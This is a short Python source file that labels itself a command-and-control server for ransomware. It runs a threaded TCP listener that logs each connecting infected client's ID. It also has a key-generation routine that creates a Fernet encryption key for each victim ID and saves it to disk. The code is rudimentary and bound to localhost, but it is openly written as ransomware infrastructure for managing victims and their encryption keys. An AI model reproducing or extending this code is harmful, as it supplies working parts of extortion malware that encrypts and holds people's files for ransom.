"""
C&C server for communication with the ransomware on local machine
"""
import socket, select
import sys
from threading import Thread
from cryptography.fernet import Fernet
import os


class ClientThread(Thread):

    def __init__(self, host: str, port: int, conn: socket) -> None:
        Thread.__init__(self)
        self.host = host
        self.port = port
        self.conn = conn
        self.id = None

    def run(self) -> None:
        while True:
            
            data = self.conn.recv(2048)

            if self.id == None:
                self.id = data

            if not data: break
            
            print(f"recieved user connectinon: {data}")
            self.conn.send(b"XD")



class Server():
    def __init__(self, host: str, port: int) -> None:
        self.ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.ss.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.ss.bind((host, port))
        self.ss.listen(1)
        self.host = host
        self.port = port
        self.threads = []


    def keyGen(self, id: str) -> bytes:
        key = Fernet.generate_key()
        with open(os.path.join("Users", id), 'wb') as gotUser:
            gotUser.write(key)

        return key

    
        
    def start(self) -> None:
        r_socks, w_socks, e_socks = select.select([self.ss], [], [])
        while True:
            print("waiting")
            for sock in r_socks:
                (conn, (self.host, self.port)) = self.ss.accept()
                new_thread = ClientThread(self.host, self.port, conn)
                new_thread.start()
                self.threads.append(new_thread)


if __name__ == "__main__":

    s = Server("127.0.0.1", 5789)
    s.start()
    
    sys.exit()
